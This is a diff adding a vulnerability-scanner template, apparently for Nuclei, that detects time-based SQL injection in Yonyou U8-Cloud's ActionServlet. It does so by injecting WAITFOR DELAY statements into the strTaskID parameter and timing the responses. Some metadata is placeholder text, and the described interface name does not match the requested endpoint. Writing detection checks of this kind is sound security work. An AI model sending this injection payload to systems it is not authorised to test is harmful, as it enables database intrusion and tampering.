@@ -1,0 +1,22 @@
+id: yonyou-U8-Cloud-strTaskID-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 用友U8-Cloud系统接口MultiRepChooseAction存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference:
+    - https://github.com/wy876/POC/commit/3f0a45b0ae99cbabbc28e1dfb046e83e863e1026
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:3%27--"
+      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:6%27--"
+      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:9%27--"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
